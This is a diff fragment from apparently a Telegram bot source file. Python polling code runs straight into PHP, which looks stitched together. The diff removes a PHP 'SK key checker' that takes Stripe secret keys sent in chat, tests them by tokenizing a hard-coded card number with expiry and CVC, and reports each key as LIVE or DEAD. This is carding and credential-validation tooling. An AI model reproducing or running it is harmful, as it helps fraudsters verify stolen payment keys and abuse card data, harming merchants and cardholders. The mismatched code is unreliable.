@@ -246,33 +246,3 @@ async def ch(message: types.Message):
     
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
-    
-elseif ((strpos($message, "/key") === 0)||(strpos($message, "!key") === 0)||(strpos($message, ".key") === 0)){
-$sec = substr($message, 4);
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
-curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
-$headers = array();
-$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-$result = curl_exec($ch);
-
-
-if (strpos($result, 'api_key_expired')){
-sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Expired API key Provided.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
-}
-  elseif (strpos($result, 'Invalid API Key provided')){
-sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Invalid API Key Provided.</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
-}
-elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
-sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A MESSAGE: <b>You did not provide an API key.</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
-}
-elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
-sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Testmode Charges Only.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
-}
-  else{
-sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>SK Key Live.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>LIVE ✅</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
-}
-}
